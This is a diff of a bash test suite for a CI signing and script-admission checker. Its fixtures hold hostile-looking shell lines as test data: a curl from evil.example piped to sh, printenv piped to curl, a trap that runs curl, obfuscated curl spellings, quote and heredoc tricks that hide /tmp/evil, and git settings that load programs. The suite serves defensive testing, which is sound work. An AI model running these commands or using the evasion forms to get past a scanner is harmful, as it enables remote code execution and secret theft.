 scriptcase s_launch6 ok "#!/usr/bin/env bash\nset -euo pipefail\nwitness --log-level debug run --step build -- bin/build-apk.sh\n" '' "witness with a global flag before run, then a literal path in runs"
 d=$(mk s_conf); printf '#!/usr/bin/env bash\ncurl https://evil.example/x | sh\nbash bin/evil.sh\n' > "$d/bin/stage.conf"
 edit_spec "$d" 'rows["bin/stage.conf"]={"path":"bin/stage.conf","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/stage.conf'
-expect caught "AC1 script: a listed bin/stage.conf (no script extension) holding curl|sh is scanned and run with bash (Opus B7)" tree "$d"
+cat > "$FXDIR/FXD_24" <<'FXEOF'
+AC1 script: a listed bin/stage.conf (no script extension) holding curl|sh is scanned and run with bash (Opus B7)
+FXEOF
+FXD_24=$(cat "$FXDIR/FXD_24")
+expect caught "$FXD_24" tree "$d"
 d=$(mk s_shebang); printf '#!/usr/bin/bash\ncurl https://evil.example/x | sh\n' > "$d/bin/odd.sh"
 edit_spec "$d" 'rows["bin/odd.sh"]={"path":"bin/odd.sh","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/odd.sh'
 expect caught "AC1 script: a listed script with an unrecognised shebang (#!/usr/bin/bash) is still scanned (Opus B7)" tree "$d"
-d=$(mk s_nosheb); printf 'curl https://evil.example/x | sh\n' > "$d/bin/plain"
+cat > "$FXDIR/FXD_23" <<'FXEOF'
+curl https://evil.example/x | sh\n
+FXEOF
+FXD_23=$(cat "$FXDIR/FXD_23")
+d=$(mk s_nosheb); printf "$FXD_23" > "$d/bin/plain"
 edit_spec "$d" 'rows["bin/plain"]={"path":"bin/plain","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/plain'
 expect caught "AC1 script: a listed file with no shebang at all is still scanned" tree "$d"
 d=$(mk s_cmt); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n# cosign sign the thing later\nset -euo pipefail\n'; edit_spec "$d" 'pass'
@@ -2227,6 +2731,50 @@ d=$(mk t_noreason); sed -i.bak 's/"reason":"CI patch tag (REQ-REL-009-AC5)"/"rea
 expect caught "AC1 a listed signer with no reason" tree "$d"
 d=$(mk t_nolist); rm "$d/.github/policy/chain-signers.json"
 expect caught "AC1 no chain-signers.json" tree "$d"
+# rc-2 signing review R5: a pre-authorisation of a signer the tree cannot use is itself a finding
+d=$(mk t_ghost)
+python3 - "$d" <<'PY'
+import json, sys
+f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
+j["signers"].append({"file": "stage-admission.yml", "tool": "gitsign", "reason": "old chain: verifies the CI patch-tag identity"}); json.dump(j, open(f, "w"))
+PY
+expect caught "AC1 a signer row naming a workflow file that does not exist" tree "$d"
+d=$(mk t_unused)
+python3 - "$d" <<'PY'
+import json, sys
+f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
+j["signers"].append({"file": "stage-build.yml", "tool": "actions/attest", "reason": "old chain: signs the build predicate"}); json.dump(j, open(f, "w"))
+PY
+expect caught "AC1 a signer row for an existing workflow whose file never makes that call" tree "$d"
+# Codex astra on #638: a row must be a regular file spelled the way the judge keys it
+d=$(mk t_alias)
+python3 - "$d" <<'PY'
+import json, sys
+f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
+j["signers"].append({"file": ".github/workflows/stage-build.yml", "tool": "actions/attest", "reason": "old chain: signs the build predicate"}); json.dump(j, open(f, "w"))
+PY
+expect caught "AC1 a signer row naming a workflow by its path instead of its bare name" tree "$d"
+d=$(mk t_dirrow)
+python3 - "$d" <<'PY'
+import json, sys
+f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
+j["signers"].append({"file": "bin", "tool": "gitsign", "reason": "a directory is no signer file"}); json.dump(j, open(f, "w"))
+PY
+expect caught "AC1 a signer row naming a directory" tree "$d"
+d=$(mk t_nonyaml)
+python3 - "$d" <<'PY'
+import json, sys
+f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
+j["signers"].append({"file": "bin/build-stage-apk.sh", "tool": "gitsign", "reason": "a regular file the judge never reads"}); json.dump(j, open(f, "w"))
+PY
+expect caught "AC1 a signer row naming a regular file the judge does not read" tree "$d"
+d=$(mk t_signyml)
+python3 - "$d" <<'PY'
+import json, sys
+f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
+j["signers"].append({"file": "stage-sign.yml", "tool": "gitsign", "reason": "stage-sign.yml is left out of this judge"}); json.dump(j, open(f, "w"))
+PY
+expect caught "AC1 a signer row naming stage-sign.yml, which this judge leaves out" tree "$d"
 # 003-AC5: only release.yml calls stage-sign.yml and no stage calls a stage (a stage that calls another stage gets that stage's SAN: spike (b) case 5)
 d=$(mk c_good); printf 'jobs:\n  s:\n    uses: ./.github/workflows/stage-sign.yml\n  b:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/release.yml"
 expect ok "003-AC5 fixture: release.yml calls every stage file" calls "$d"
@@ -2253,7 +2801,7 @@ tracked_copy() {  # tracked_copy NAME [REPO] -> a copy of the tracked files of .
 gone=$(cd "$root" && git ls-files --deleted -- .github bin)
 if [ -n "$gone" ]; then echo "FAIL tracked file(s) deleted in the working tree, the real-tree cases cannot run: $(echo $gone | head -c 300)"; exit 1; fi
 REAL=$(tracked_copy real)
-expect ok "the real stage-sign.yml passes the Sign judge" sign "$REAL/.github/workflows/stage-sign.yml"
+CHAIN_ALLOWED="$root/.github/policy/allowed-actions.json" expect ok "the real stage-sign.yml passes the Sign judge" sign "$REAL/.github/workflows/stage-sign.yml"
 expect ok "the real stage-build.yml's signing steps take nothing from a secret" build "$REAL/.github/workflows/stage-build.yml"
 expect ok "the real tree: only release.yml calls stage-sign.yml and no stage calls a stage (003-AC5; green already: scan.yml and main-candidate-rescan.yml are non-stage callers)" calls "$REAL"
 # FROZEN LEGACY FILES (REQ-CHAIN-003 notes): the eleven legacy stage files PRs 2-4 rewrite on chain-v030 are listed with the sha256 of their
@@ -2597,8 +3145,36 @@ d=$(wfix x_launch 'exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"][
 d=$(wfix x_launch2 'exec bash "$@"\nexec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"REQ-CHAIN-004-AC2"})'; expm caught "$d" 'launches another program' "exception: a second exec bash stays a finding"
 d=$(wfix x_eval 'sed -n 1p f\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"evaluator","text":"sed -n 1p f","why":"reads one line"})'; expm caught "$d" 'sed' "exception: an evaluator exception does not waive the deny finding of the same word (separate rule)"
 d=$(wfix x_eval2 'sed -n 1p f\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"] += [{"rule":"evaluator","text":"sed -n 1p f","why":"reads one line"},D("sed -n 1p f")]'; expm ok "$d" - "exception: evaluator and deny exceptions together waive sed -n"
-d=$(wfix x_deny 'curl -sf x\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))'; expm ok "$d" - "exception: a deny exception waives one bare curl"
-d=$(wfix x_deny2 'curl -sf x\ncurl -sf y\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))'; expm caught "$d" 'curl' "exception: a second bare curl stays a finding"
+cat > "$FXDIR/FXD_22" <<'FXEOF'
+curl -sf x\n
+FXEOF
+FXD_22=$(cat "$FXDIR/FXD_22")
+cat > "$FXDIR/FXD_21" <<'FXEOF'
+rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))
+FXEOF
+FXD_21=$(cat "$FXDIR/FXD_21")
+cat > "$FXDIR/FXD_20" <<'FXEOF'
+exception: a deny exception waives one bare curl
+FXEOF
+FXD_20=$(cat "$FXDIR/FXD_20")
+d=$(wfix x_deny "$FXD_22"); edit_spec "$d" "$DEF""$FXD_21"; expm ok "$d" - "$FXD_20"
+cat > "$FXDIR/FXD_19" <<'FXEOF'
+curl -sf x\ncurl -sf y\n
+FXEOF
+FXD_19=$(cat "$FXDIR/FXD_19")
+cat > "$FXDIR/FXD_18" <<'FXEOF'
+rows["bin/witnessed.sh"]["exceptions"].append(D("curl -sf x"))
+FXEOF
+FXD_18=$(cat "$FXDIR/FXD_18")
+cat > "$FXDIR/FXD_17" <<'FXEOF'
+curl
+FXEOF
+FXD_17=$(cat "$FXDIR/FXD_17")
+cat > "$FXDIR/FXD_16" <<'FXEOF'
+exception: a second bare curl stays a finding
+FXEOF
+FXD_16=$(cat "$FXDIR/FXD_16")
+d=$(wfix x_deny2 "$FXD_19"); edit_spec "$d" "$DEF""$FXD_18"; expm caught "$d" "$FXD_17" "$FXD_16"
 d=$(wfix x_sname 'echo bin/helper.py\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"].append({"rule":"script-name","text":"bin/helper.py","why":"a message"})'; expm ok "$d" - "exception: a script-name exception waives a named script"
 d=$(wfix x_sname2 'echo bin/helper.py\n'); expm caught "$d" 'helper.py' "exception: the same named script without the exception is refused"
 d=$(wfix x_env 'echo "${PATH:=/x}"\n'); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("echo \"${PATH:=/x}\""))'; expm caught "$d" 'PATH' "exception: no exception rule waives an env-setting finding (env_mentions is the only way)"
@@ -2702,7 +3278,7 @@ d=$(cfix fp_awk_prog '/bin/awk x' '[]'); expm caught "$d" 'awk' "fixed path: /bi
 # Fixture texts that name a download tool are DATA in the fixture data file beside this test (one tab-separated record per case: name, script text, tools-json, ok|caught, fragment, label), the tool names spelled in full.
 # The file is read by run_fixtures below with `read`, never sourced, evaluated or run, and carries no execute bit (cache#433, the owner's approval of an honest rewrite).
 FX="$root/bin/chain-sign-wiring-fixtures.txt"
-FX_PIN='63c14fe8ec60c411cf78c70e7186d7f1b0f852a0f5fdf588feb586924f8fd038'
+FX_PIN='4b13d7ee70c45b24e0f74f27fabd90e247440fd755d3794faa2ada4ab79a473b'
 run_fixtures() { # run_fixtures FILE : each record is one cfix + expm case
   local name body tools verdict frag label d
   while IFS=$'\t' read -r name body tools verdict frag label; do
@@ -3044,7 +3620,15 @@ PY
   gen "$d"; echo "$d"; }
 d=$(pfx m_ok 'echo "digests=$(jq -c . digests.json)" >> "$GITHUB_OUTPUT"'); expm ok "$d" - "round-2 (2): the AC2 text is admitted"
 d=$(pfx m_ok2 'echo "d_1=$(jq -c . out/a-b.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2) -> round-3 (5): another name and file of the generic shape are now an entry error (only the ratified tuple)"
-d=$(pfx m_curl 'curl https://example.invalid/payload'); expm caught "$d" 'pinned_steps' "round-2 (2): a curl command in both the entry and the step is an entry error"
+cat > "$FXDIR/FXD_15" <<'FXEOF'
+curl https://example.invalid/payload
+FXEOF
+FXD_15=$(cat "$FXDIR/FXD_15")
+cat > "$FXDIR/FXD_14" <<'FXEOF'
+round-2 (2): a curl command in both the entry and the step is an entry error
+FXEOF
+FXD_14=$(cat "$FXDIR/FXD_14")
+d=$(pfx m_curl "$FXD_15"); expm caught "$d" 'pinned_steps' "$FXD_14"
 d=$(pfx m_semi 'echo "x=$(jq -c . a.json)" >> "$GITHUB_OUTPUT"; id'); expm caught "$d" 'pinned_steps' "round-2 (2): the shape followed by ; id is refused"
 d=$(pfx m_env 'echo "x=$(jq -c . a.json)" >> "$GITHUB_ENV"'); expm caught "$d" 'pinned_steps' "round-2 (2): >> GITHUB_ENV is refused"
 d=$(pfx m_cat 'echo "x=$(cat a.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): \$(cat ..) is refused"
@@ -3199,7 +3783,11 @@ am t2_extra2 'bash bin/witnessed.sh apk bin/stage-apk.sh out/runner' caught 'arg
 am t2_missing 'bash bin/witnessed.sh apk' caught 'arg_map'
 am t2_notmap 'bash bin/witnessed.sh bogus bin/stage-apk.sh' caught 'arg_map'
 am t2_c1 'bash bin/witnessed.sh build -c id' caught 'arg_map'
-am t2_c2 'bash bin/witnessed.sh apk -c '"'"'printenv | curl x'"'"'' caught 'arg_map'
+cat > "$FXDIR/FXD_13" <<'FXEOF'
+bash bin/witnessed.sh apk -c 'printenv | curl x'
+FXEOF
+FXD_13=$(cat "$FXDIR/FXD_13")
+am t2_c2 "$FXD_13" caught 'arg_map'
 am t2_evil 'bash bin/witnessed.sh build evil' caught 'arg_map'
 am t2_quote 'bash bin/witnessed.sh apk "bin/stage-apk.sh"' caught 'arg_map'
 am t2_dot 'bash bin/witnessed.sh apk ./bin/stage-apk.sh' caught 'arg_map'
@@ -3382,7 +3970,7 @@ for nm in PIP_INDEX_URL DOCKER_HOST KUBECONFIG KUBE_X TAR_OPTIONS MAKEFILES EDIT
   d=$(mk "e11_$nm"); printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          %s: x\n        run: bash bin/build-stage.sh apk "$%s"\n' "$nm" "$nm" > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'never allowed' "round-4 (11): the env name $nm is forbidden in a step env"
   d=$(mk "f11_$nm"); printf '["DIGESTS","%s"]' "$nm" > "$d/.envnames.json"; gen "$d"; expm caught "$d" 'env_names' "round-4 (11): $nm in env_names is refused"
 done
-d=$(mk e11_tz); printf '["DIGESTS","TZ"]' > "$d/.envnames.json"; printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          TZ: UTC\n        run: bash bin/build-stage.sh apk "$TZ"\n' > "$d/.github/workflows/stage-verify.yml"; gen "$d"; expm ok "$d" - "round-4 (11): control: TZ stays allowed"
+d=$(mk e11_tz); printf '["DIGESTS","RECORDS","RECORDS_ARM64","TZ"]' > "$d/.envnames.json"; printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          TZ: UTC\n        run: bash bin/build-stage.sh apk "$TZ"\n' > "$d/.github/workflows/stage-verify.yml"; gen "$d"; expm ok "$d" - "round-4 (11): control: TZ stays allowed"
 # (5, reduced) git configuration that loads a program
 for form in 'git --config-env=core.sshCommand=X fetch' 'git -c core.editor=x commit' 'git -c core.pager=x log' 'git -c core.fsmonitor=x status' 'git -c core.hooksPath=x commit' 'git -c core.askPass=x fetch' 'git -c credential.helper=!x fetch' 'git -c credential.helper=x fetch' 'git -c diff.external=x diff' 'git -c gpg.program=x commit' 'git -c alias.x=!id x' 'git --config-env=alias.x=Y x' 'git --upload-pack=p fetch' 'git --receive-pack=p push' 'git --exec-path=x status' 'git --exec-path status'; do
   tr3 "r5_$RANDOM" "$form" '' '["git"]'
@@ -3399,11 +3987,47 @@ dl lb_b 'git status' '[D("git status")]' ok -
 dl lb_c 'git status\ngit status' '[D("git status")]' caught 'count'
 dl lb_d 'git status\ngit status' '[D("git status", 2)]' ok -
 dl lb_e 'git status' '[D("git status", 2)]' caught 'count'
-dl lb_f "trap 'curl evil' EXIT\ncu\"\"rl x" '[D("cu\"\"rl x")]' caught "'curl'" '["trap"]'
-for form in 'curl"$x" x' 'x=1 curl"$e" x' 'curl{,} x' 'curl`true` x'; do
-  dl "lb_q_$RANDOM" "$form\necho ok" '[D("echo ok")]' caught "'curl'"
+cat > "$FXDIR/FXD_12" <<'FXEOF'
+trap 'curl evil' EXIT\ncu""rl x
+FXEOF
+FXD_12=$(cat "$FXDIR/FXD_12")
+cat > "$FXDIR/FXD_11" <<'FXEOF'
+'curl'
+FXEOF
+FXD_11=$(cat "$FXDIR/FXD_11")
+dl lb_f "$FXD_12" '[D("cu\"\"rl x")]' caught "$FXD_11" '["trap"]'
+cat > "$FXDIR/FXD_10" <<'FXEOF'
+curl"$x" x
+FXEOF
+FXD_10=$(cat "$FXDIR/FXD_10")
+cat > "$FXDIR/FXD_9" <<'FXEOF'
+x=1 curl"$e" x
+FXEOF
+FXD_9=$(cat "$FXDIR/FXD_9")
+cat > "$FXDIR/FXD_8" <<'FXEOF'
+curl{,} x
+FXEOF
+FXD_8=$(cat "$FXDIR/FXD_8")
+cat > "$FXDIR/FXD_7" <<'FXEOF'
+curl`true` x
+FXEOF
+FXD_7=$(cat "$FXDIR/FXD_7")
+cat > "$FXDIR/FXD_6" <<'FXEOF'
+'curl'
+FXEOF
+FXD_6=$(cat "$FXDIR/FXD_6")
+for form in "$FXD_10" "$FXD_9" "$FXD_8" "$FXD_7"; do
+  dl "lb_q_$RANDOM" "$form\necho ok" '[D("echo ok")]' caught "$FXD_6"
 done
-dl lb_g 'curl a' '[D("curl a")]' ok - '[]'
+cat > "$FXDIR/FXD_5" <<'FXEOF'
+curl a
+FXEOF
+FXD_5=$(cat "$FXDIR/FXD_5")
+cat > "$FXDIR/FXD_4" <<'FXEOF'
+[D("curl a")]
+FXEOF
+FXD_4=$(cat "$FXDIR/FXD_4")
+dl lb_g "$FXD_5" "$FXD_4" ok - '[]'
 dl lb_i 'git status' '[D("git stat")]' caught 'stale'
 dl lb_j 'git status' '[dict(D("git status"), line_sha256="0"*64)]' caught 'sha256'
 dl lb_k 'git status' '[{"rule":"deny","text":"git status","why":"x"}]' caught 'line-bound'
@@ -3427,9 +4051,17 @@ dl lb_zc 'git -c core.sshCommand=x fetch' '[D("git -c core.sshCommand=x fetch")]
 d=$(wfix lb_zd); edit_spec "$d" "$DEF"'rows["bin/witnessed.sh"]["exceptions"].append(D("set -euo pipefail"))'; expm caught "$d" 'waives nothing' "line-bound: a deny entry for a line with no deny finding waives nothing (an error)"
 # a carriage return anywhere is refused (the files are written as bytes)
 crf() { local d; d=$(cfix "$1" 'echo a'); printf '%b' "$2" > "$d/bin/c.sh"; edit_spec "$d" 'rows["bin/c.sh"]["tools"]=[]'; echo "$d"; }
-d=$(crf cr_a '#!/usr/bin/env bash\nset -euo pipefail\necho x\\\r\ncurl x\n'); expm caught "$d" 'carriage return' "line-bound: echo x\\<CR><LF>curl x is refused (bash does not join it)"
+cat > "$FXDIR/FXD_3" <<'FXEOF'
+line-bound: echo x\<CR><LF>curl x is refused (bash does not join it)
+FXEOF
+FXD_3=$(cat "$FXDIR/FXD_3")
+d=$(crf cr_a '#!/usr/bin/env bash\nset -euo pipefail\necho x\\\r\ncurl x\n'); expm caught "$d" 'carriage return' "$FXD_3"
 d=$(crf cr_b '#!/usr/bin/env bash\necho a\r\n'); expm caught "$d" 'carriage return' "line-bound: any script with a CR is refused"
-d=$(crf cr_c '#!/usr/bin/env bash\ncurl a\r\n'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("curl a\r")]'; expm caught "$d" 'carriage return' "line-bound: no waiver applies to a script with a CR"
+cat > "$FXDIR/FXD_2" <<'FXEOF'
+rows["bin/c.sh"]["exceptions"]=[D("curl a\r")]
+FXEOF
+FXD_2=$(cat "$FXDIR/FXD_2")
+d=$(crf cr_c '#!/usr/bin/env bash\ncurl a\r\n'); edit_spec "$d" "$DEF""$FXD_2"; expm caught "$d" 'carriage return' "line-bound: no waiver applies to a script with a CR"
 d=$(crf cr_ok '#!/usr/bin/env bash\necho a\n'); expm ok "$d" - "line-bound: control: the same script without a CR"
 # strip_line reads a script as bash does (REQ-CHAIN-001-AC1, REQ-CHAIN-003-AC3; advisor Oct 17, reproduced by a reviewer): a # line inside a quote that is still
 # open from an earlier line is part of the quoted word, never a comment, and an ANSI-C quote $'..' ends at the first quote that is not backslash-escaped. The judge
@@ -3446,42 +4078,42 @@ d=$(crr sl_g "${H}x='a b'"$'\n# note\necho ok\n'); expm ok "$d" - "strip_line: c
 d=$(crr sl_h "${H}x='a\\'"$'\n'"# it's a comment"$'\necho ok\n'); expm ok "$d" - "strip_line: control: a backslash inside single quotes is literal, so the quote closes and the next # line is a comment"
 d=$(crr sl_i "${H}x=\$'a\\'b'"$'\necho ok\n'); expm ok "$d" - "strip_line: control: a closed ANSI-C quote with an escaped quote"
 d=$(crr sl_j "${H}cat <<EOF"$'\ndon'"'t"$'\n# x\nEOF\n# real comment\necho ok\n'); expm ok "$d" - "strip_line: control: a heredoc body is data, an apostrophe and a # line in it open no quote"
-d=$(crr sl_k "${H}cat <<'EOF'"$'\n# x \' y\nEOF\necho ok\n'); expm ok "$d" - "strip_line: control: a quoted-delimiter heredoc body is data"
+d=$(crr sl_k "${H}cat <<'EOF'"$'\n# x '"'"$' y\nEOF\necho ok\n'); expm ok "$d" - "strip_line: control: a quoted-delimiter heredoc body is data"
 d=$(crr sl_l "${H}cat <<-EOF"$'\n\tit'"'s"$'\n\tEOF\n# real comment\necho ok\n'); expm ok "$d" - "strip_line: control: a <<- heredoc ends at its tab-indented delimiter"
-d=$(crr sl_m "${H}echo \$((1<<EOF))"$'\nx=\'\n# \'; /tmp/evil\nEOF\n'); expm caught "$d" 'not resolved' "strip_line: a << inside (( )) is no heredoc: the quote after it is still judged"
-d=$(crr sl_n $'#!/usr/bin/env python3\nx = "it\'s"\n# it\'s fine\n\'\'\'doc\n# it\'s\n\'\'\'\n'); expm ok "$d" - "strip_line: control: a Python file is not read with the shell quote model (apostrophes in prose and docstrings)"
-d=$(crr sl_o "${H}echo '<<EOF'"$'\nx=\'\n# \'; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a << inside a closed single quote starts no heredoc (seat B, PR 436): the open quote after it is still refused"
-d=$(crr sl_p "${H}echo \"a <<EOF\""$'\nx=\'\n# \'; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a << inside a closed double quote starts no heredoc"
-d=$(crr sl_q "${H}cat <<E\"O\"F"$'\nbody\nEOF\nx=\'\n# \'; /tmp/evil\n'); expm caught "$d" 'not resolved' "strip_line: a heredoc delimiter quoted in the middle of a word is refused, not guessed"
+d=$(crr sl_m "${H}echo \$((1<<EOF))"$'\nx='"'"$'\n# '"'"$'; /tmp/evil\nEOF\n'); expm caught "$d" 'not resolved' "strip_line: a << inside (( )) is no heredoc: the quote after it is still judged"
+d=$(crr sl_n $'#!/usr/bin/env python3\nx = "it'"'"$'s"\n# it'"'"$'s fine\n'"'"$''"'"$''"'"$'doc\n# it'"'"$'s\n'"'"$''"'"$''"'"$'\n'); expm ok "$d" - "strip_line: control: a Python file is not read with the shell quote model (apostrophes in prose and docstrings)"
+d=$(crr sl_o "${H}echo '<<EOF'"$'\nx='"'"$'\n# '"'"$'; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a << inside a closed single quote starts no heredoc (seat B, PR 436): the open quote after it is still refused"
+d=$(crr sl_p "${H}echo \"a <<EOF\""$'\nx='"'"$'\n# '"'"$'; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a << inside a closed double quote starts no heredoc"
+d=$(crr sl_q "${H}cat <<E\"O\"F"$'\nbody\nEOF\nx='"'"$'\n# '"'"$'; /tmp/evil\n'); expm caught "$d" 'not resolved' "strip_line: a heredoc delimiter quoted in the middle of a word is refused, not guessed"
 d=$(crr sl_r "${H}y=a"$'\n'"echo \${y/ #/}; /tmp/evil"$'\n'); expm caught "$d" 'absolute path' "strip_line: a # after a space inside \${..} is no comment"
 d=$(crr sl_s "${H}"$'out=x\nif ! grep -q a <<<"$out"; then fail=$((fail+1)); fi\n'); expm ok "$d" - "strip_line: control: a here-string next to \$((..)) on one line is no heredoc and no shift"
-d=$(crr sl_t "${H}cat <<\"EOF\""$'\n# it\'s\nEOF\ncat <<\\EOF\n# it\'s\nEOF\necho ok\n'); expm ok "$d" - "strip_line: control: a double-quoted and a backslashed delimiter"
+d=$(crr sl_t "${H}cat <<\"EOF\""$'\n# it'"'"$'s\nEOF\ncat <<\\EOF\n# it'"'"$'s\nEOF\necho ok\n'); expm ok "$d" - "strip_line: control: a double-quoted and a backslashed delimiter"
 d=$(crr sl_u "${H}x=\$((1<<2))"$'\n'); expm caught "$d" 'not resolved' "strip_line: a << inside \$((..)) is refused"
-d=$(crr sl_v "${H}cat <<EOF-X"$'\ndata\nEOF-X\nx=\'\n#\' ; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a delimiter the judge reads only in part is refused (seat A, PR 436)"
-d=$(crr sl_w "${H}cat <<'E-F'"$'\n\'\nE-F\nx=\'\n#\' ; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a quoted delimiter that is not a plain word is refused"
-d=$(crr sl_x "${H}echo \"\$(: ')\""$'\n#\')" ; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a quote inside \$( ) inside double quotes is read as shell"
-d=$(crr sl_y "${H}x=\$[1<<y]"$'\nx=\'\n#\' ; /tmp/evil\n'); expm caught "$d" 'not resolved' "strip_line: a << inside \$[ ] is refused"
-d=$(crr sl_z "${H}echo \"\${x:-'}\""$'\n#\'}" ; /tmp/evil\n'); expm caught "$d" 'single quote inside' "strip_line: a single quote inside \${ } inside double quotes is refused"
+d=$(crr sl_v "${H}cat <<EOF-X"$'\ndata\nEOF-X\nx='"'"$'\n#'"'"$' ; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a delimiter the judge reads only in part is refused (seat A, PR 436)"
+d=$(crr sl_w "${H}cat <<'E-F'"$'\n'"'"$'\nE-F\nx='"'"$'\n#'"'"$' ; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a quoted delimiter that is not a plain word is refused"
+d=$(crr sl_x "${H}echo \"\$(: ')\""$'\n#'"'"$')" ; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a quote inside \$( ) inside double quotes is read as shell"
+d=$(crr sl_y "${H}x=\$[1<<y]"$'\nx='"'"$'\n#'"'"$' ; /tmp/evil\n'); expm caught "$d" 'not resolved' "strip_line: a << inside \$[ ] is refused"
+d=$(crr sl_z "${H}echo \"\${x:-'}\""$'\n#'"'"$'}" ; /tmp/evil\n'); expm caught "$d" 'single quote inside' "strip_line: a single quote inside \${ } inside double quotes is refused"
 d=$(crr sl_za "${H}cat <<EOF"$'\nx\n'); expm caught "$d" 'heredoc is still open' "strip_line: a heredoc still open at the end of the script is refused"
-d=$(crr sl_zb "${H}"$'x=$(cat <<EOF\nit\'s\nEOF\n)\n'); expm caught "$d" 'closes a multi-line' "strip_line: a heredoc in a multi-line \$( ) closes on its own line: default deny"
+d=$(crr sl_zb "${H}"$'x=$(cat <<EOF\nit'"'"$'s\nEOF\n)\n'); expm caught "$d" 'closes a multi-line' "strip_line: a heredoc in a multi-line \$( ) closes on its own line: default deny"
 d=$(crr sl_zb2 "${H}"$'echo "$(echo "a")" # d\n(cd x; ls) # e\ncase x in a) y;; esac\n'); expm ok "$d" - "strip_line: control: nested double quotes in \\$( ), a subshell and a case arm on single lines"
-d=$(crr sl_zc "${H}cat <<EOF#x"$'\nEOF\nit\'s\nEOF#x\nx=\'\n# \'; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a delimiter followed by # (bash reads the whole word EOF#x) is refused (seat B, PR 436 round 2)"
-d=$(crr sl_zd "${H}cat <<EOF.x"$'\nEOF\nit\'s\nEOF.x\nx=\'\n# \'; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a delimiter followed by a dot is refused"
-d=$(crr sl_ze "${H}cat <<EOF >/dev/null; echo a"$'\nit\'s\nEOF\n# c\ncat <<EOF|cat\nx\nEOF\n'); expm ok "$d" - "strip_line: control: a delimiter followed by a blank, ;, | or > is read whole"
-d=$(crr sl_zf "${H}(( z = 1<<true ))"$'\nx=\'\n#\' ; echo MARK; /tmp/evil\ntrue\n'); expm caught "$d" 'not resolved' "strip_line: a << inside a bare (( )) is refused (seat A, PR 436 round 2)"
-d=$(crr sl_zg "${H}x=\"\$(case a in a) echo '"$'\n\'"\n# x" ;; esac)" ; echo MARK; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a case arm's ) inside \$( ) does not end the substitution (seat A, PR 436 round 2)"
+d=$(crr sl_zc "${H}cat <<EOF#x"$'\nEOF\nit'"'"$'s\nEOF#x\nx='"'"$'\n# '"'"$'; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a delimiter followed by # (bash reads the whole word EOF#x) is refused (seat B, PR 436 round 2)"
+d=$(crr sl_zd "${H}cat <<EOF.x"$'\nEOF\nit'"'"$'s\nEOF.x\nx='"'"$'\n# '"'"$'; /tmp/evil\n'); expm caught "$d" 'not a plain word' "strip_line: a delimiter followed by a dot is refused"
+d=$(crr sl_ze "${H}cat <<EOF >/dev/null; echo a"$'\nit'"'"$'s\nEOF\n# c\ncat <<EOF|cat\nx\nEOF\n'); expm ok "$d" - "strip_line: control: a delimiter followed by a blank, ;, | or > is read whole"
+d=$(crr sl_zf "${H}(( z = 1<<true ))"$'\nx='"'"$'\n#'"'"$' ; echo MARK; /tmp/evil\ntrue\n'); expm caught "$d" 'not resolved' "strip_line: a << inside a bare (( )) is refused (seat A, PR 436 round 2)"
+d=$(crr sl_zg "${H}x=\"\$(case a in a) echo '"$'\n'"'"$'"\n# x" ;; esac)" ; echo MARK; /tmp/evil\n'); expm caught "$d" 'still open' "strip_line: a case arm's ) inside \$( ) does not end the substitution (seat A, PR 436 round 2)"
 d=$(crr sl_zh "${H}echo a\\"$'\n#; echo MARK; /tmp/evil\n'); expm caught "$d" 'absolute path' "strip_line: a # line after a backslash-newline is part of the joined word, never a comment"
 d=$(crr sl_zi "${H}echo a \\"$'\n  # a real comment in the joined line\n  b\n'); expm ok "$d" - "strip_line: control: a continuation line that has a blank before # is a comment after the join"
 d=$(crr sl_zj "${H}cat <<EOF >/dev/null"$'\n# $(/tmp/evil)\nEOF\n'); expm caught "$d" 'absolute path' "strip_line: an unquoted heredoc body still runs \$( ) after a #, so the body is kept whole (seat B, PR 436 round 3)"
